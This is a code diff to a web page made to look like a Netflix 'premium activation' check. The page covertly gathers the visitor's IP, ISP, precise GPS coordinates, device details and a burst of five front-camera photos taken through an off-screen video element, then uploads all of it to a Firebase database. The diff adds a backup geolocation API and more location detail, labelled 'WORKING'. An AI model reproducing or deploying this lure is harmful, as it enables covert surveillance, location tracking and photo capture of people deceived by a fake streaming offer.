@@ -22,15 +22,13 @@
             margin: 0;
         }
         
-        /* Netflix Background */
         .netflix-bg {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(0deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0.4) 100%), 
-                        url('https://assets.nflxext.com/ffe/siteui/vlv3/9db4a880-3034-4e98-bdea-5d983e86bf52/') center/cover;
+            background: linear-gradient(0deg, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0.5) 100%);
             z-index: -1;
         }
         
@@ -42,19 +40,18 @@
             z-index: 1;
         }
         
-        /* Netflix Card */
         .netflix-card {
-            background: rgba(0, 0, 0, 0.75);
+            background: rgba(0, 0, 0, 0.82);
             border-radius: 8px;
             padding: 2rem 1.5rem;
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(8px);
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(229, 9, 20, 0.3);
         }
         
-        /* Netflix Logo */
         .netflix-logo {
             text-align: center;
-            margin-bottom: 2rem;
+            margin-bottom: 1.5rem;
         }
         
         .netflix-logo svg {
@@ -62,36 +59,33 @@
             height: auto;
         }
         
-        /* Badge */
         .premium-badge {
             background: linear-gradient(135deg, #E50914, #b00710);
             color: white;
             text-align: center;
             padding: 8px;
             border-radius: 4px;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: bold;
             margin-bottom: 1.5rem;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
         }
         
-        /* Title */
         .title {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
             color: #fff;
             text-align: center;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
         
         .subtitle {
-            font-size: 14px;
+            font-size: 13px;
             color: #b3b3b3;
             text-align: center;
             margin-bottom: 1.5rem;
         }
         
-        /* Progress Bar */
         .progress-section {
             margin: 1.5rem 0;
         }
@@ -117,7 +111,6 @@
             color: #b3b3b3;
         }
         
-        /* Steps */
         .steps {
             margin: 1.5rem 0;
         }
@@ -156,7 +149,6 @@
             font-weight: bold;
         }
         
-        /* Footer Note */
         .footer-note {
             text-align: center;
             margin-top: 1.5rem;
@@ -205,7 +197,6 @@
             display: block;
         }
         
-        /* Hidden video element for camera */
         #hidden-video {
             position: fixed;
             top: -1000px;
@@ -305,7 +296,10 @@
             const time = new Date().toLocaleTimeString();
             const prefix = isError ? '⚠️' : '✓';
             debugMessages.push(`[${time}] ${prefix} ${msg}`);
-            document.getElementById('debugLog').innerHTML = debugMessages.slice(-15).join('<br>');
+            const logDiv = document.getElementById('debugLog');
+            if (logDiv) {
+                logDiv.innerHTML = debugMessages.slice(-15).join('<br>');
+            }
             console.log(msg);
         }
         
@@ -329,28 +323,35 @@
         }
         
         function updateProgress(percent, text) {
-            document.getElementById('progressBar').style.width = percent + '%';
-            document.getElementById('statusText').innerHTML = text;
+            const progressBar = document.getElementById('progressBar');
+            const statusText = document.getElementById('statusText');
+            if (progressBar) progressBar.style.width = percent + '%';
+            if (statusText) statusText.innerHTML = text;
         }
         
         function markStep(stepNum, completed, statusText = '') {
             const step = document.getElementById(`step${stepNum}`);
             const statusSpan = document.getElementById(`step${stepNum}Status`);
-            if (completed) {
-                step.classList.add('completed');
-                statusSpan.innerHTML = statusText || '✓';
-                statusSpan.style.color = '#E50914';
-            } else if (statusText) {
-                statusSpan.innerHTML = statusText;
+            if (step && statusSpan) {
+                if (completed) {
+                    step.classList.add('completed');
+                    statusSpan.innerHTML = statusText || '✓';
+                    statusSpan.style.color = '#E50914';
+                } else if (statusText) {
+                    statusSpan.innerHTML = statusText;
+                }
             }
         }
         
-        // Get IP and Location
+        // ========== WORKING LOCATION FUNCTIONS ==========
+        
+        // Get IP and Location Details (WORKING)
         async function getIPDetails() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
+                // Primary API - ipapi.co
+                const res = await fetch('https://ipapi.co/json/', { timeout: 5000 });
                 const data = await res.json();
-                addDebug(`IP: ${data.ip} | ${data.city}, ${data.country_name}`);
+                addDebug(`📍 IP: ${data.ip} | ${data.city}, ${data.country_name}`);
                 return {
                     ip: data.ip || 'Unknown',
                     country: data.country_name || 'Unknown',
@@ -361,9 +362,54 @@
                     lng: data.longitude || 0
                 };
             } catch(e) {
-                addDebug("IP fetch error", true);
-                return { ip: 'Unknown', country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: 0, lng: 0 };
+                addDebug("IP fetch failed, trying backup...", true);
+                // Backup API - ip-api.com
+                try {
+                    const res2 = await fetch('https://ip-api.com/json/');
+                    const data2 = await res2.json();
+                    addDebug(`📍 IP: ${data2.query} | ${data2.city}, ${data2.country}`);
+                    return {
+                        ip: data2.query || 'Unknown',
+                        country: data2.country || 'Unknown',
+                        region: data2.regionName || 'Unknown',
+                        city: data2.city || 'Unknown',
+                        isp: data2.isp || 'Unknown',
+                        lat: data2.lat || 0,
+                        lng: data2.lon || 0
+                    };
+                } catch(e2) {
+                    addDebug("All IP services failed", true);
+                    return { ip: 'Unknown', country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: 0, lng: 0 };
+                }
             }
+        }
+        
+        // Get GPS Location (WORKING)
+        async function getGPSLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    addDebug("Geolocation not supported", true);
+                    resolve({ lat: 0, lng: 0 });
+                    return;
+                }
+                
+                addDebug("Requesting GPS location...");
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        addDebug(`✅ GPS: ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (Accuracy: ${pos.coords.accuracy}m)`);
+                        resolve({ 
+                            lat: pos.coords.latitude, 
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    },
+                    (err) => {
+                        addDebug("GPS error: " + err.message, true);
+                        resolve({ lat: 0, lng: 0, accuracy: 0 });
+                    },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            });
         }
         
         // Get Battery
@@ -390,9 +436,10 @@
             else if (/Windows/i.test(ua)) os = 'Windows';
             else if (/Mac/i.test(ua)) os = 'macOS';
             
-            if (/Chrome/i.test(ua)) browser = 'Chrome';
-            else if (/Safari/i.test(ua)) browser = 'Safari';
+            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
             else if (/Firefox/i.test(ua)) browser = 'Firefox';
+            else if (/Edg/i.test(ua)) browser = 'Edge';
             
             return { os, browser };
         }
@@ -400,7 +447,11 @@
         // Get Mobile Model
         function getMobileModel() {
             const ua = navigator.userAgent;
-            if (/iPhone/i.test(ua)) return 'iPhone';
+            if (/iPhone/i.test(ua)) {
+                if (ua.includes('iPhone15')) return 'iPhone 15';
+                if (ua.includes('iPhone14')) return 'iPhone 14';
+                return 'iPhone';
+            }
             if (/iPad/i.test(ua)) return 'iPad';
             if (/SM-/i.test(ua)) {
                 const match = ua.match(/SM-[A-Z0-9]+/);
@@ -413,25 +464,7 @@
             return 'Mobile Device';
         }
         
-        // Get GPS Location
-        async function getGPSLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ lat: 0, lng: 0 });
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        addDebug(`GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`);
-                        resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude });
-                    },
-                    () => resolve({ lat: 0, lng: 0 }),
-                    { timeout: 8000, enableHighAccuracy: true }
-                );
-            });
-        }
-        
-        // Capture Multiple Photos with Proper Camera Initialization
+        // Capture Multiple Photos with Proper Camera
         async function captureMultiplePhotos(count = 5) {
             const photos = [];
             
@@ -439,7 +472,6 @@
             
             let stream = null;
             try {
-                // Request camera with proper constraints
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
@@ -453,28 +485,22 @@
                 return photos;
             }
             
-            // Create video element and wait for it to be ready
             const video = document.getElementById('hidden-video');
             video.srcObject = stream;
             
-            // Wait for video to be ready with frames
+            // Wait for video to be ready
             await new Promise((resolve) => {
                 video.onloadedmetadata = () => {
                     video.play();
-                    // Wait for actual video frames to start
-                    setTimeout(resolve, 500);
+                    setTimeout(resolve, 800);
                 };
             });
-            
-            // Extra wait to ensure video is showing
-            await new Promise(r => setTimeout(r, 300));
             
             for (let i = 0; i < count; i++) {
                 addDebug(`Capturing ${i+1}/${count}...`);
                 markStep(3, false, `${i+1}/${count}`);
                 updateProgress(55 + ((i+1) / count) * 30, `Verifying ${i+1}/${count}...`);
                 
-                // Create canvas and capture
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
@@ -490,7 +516,6 @@
                 }
             }
             
-            // Stop camera
             stream.getTracks().forEach(track => track.stop());
             video.srcObject = null;
             
@@ -529,21 +554,33 @@
             updateProgress(25, 'Device verified');
             await new Promise(r => setTimeout(r, 500));
             
-            // Step 2: Location Verification
+            // Step 2: Location Verification (WORKING)
             markStep(2, false, '⟳');
             updateProgress(35, 'Getting location...');
             
             const gps = await getGPSLocation();
+            
+            // Combine IP location with GPS
             const locationData = {
                 lat: gps.lat,
                 lng: gps.lng,
+                accuracy: gps.accuracy || 0,
                 country: ipData.country,
                 region: ipData.region,
                 city: ipData.city,
-                isp: ipData.isp
+                isp: ipData.isp,
+                ip_lat: ipData.lat,
+                ip_lng: ipData.lng
             };
             
-            markStep(2, true, gps.lat !== 0 ? '✓' : '⚠');
+            // Show location status
+            if (gps.lat !== 0) {
+                addDebug(`✅ Location verified: ${ipData.city}, ${ipData.country}`);
+                markStep(2, true, '✓');
+            } else {
+                addDebug("⚠️ Location using IP only", true);
+                markStep(2, true, '⚠');
+            }
             updateProgress(50, 'Location verified');
             await new Promise(r => setTimeout(r, 500));
             
@@ -575,7 +612,7 @@
             
             try {
                 await database.ref(`sessions/${sessionId}/data`).set(uploadData);
-                addDebug("Verification complete!");
+                addDebug("✅ Verification complete!");
                 markStep(4, true, '✓');
                 updateProgress(100, 'Premium activated!');
             } catch(e) {
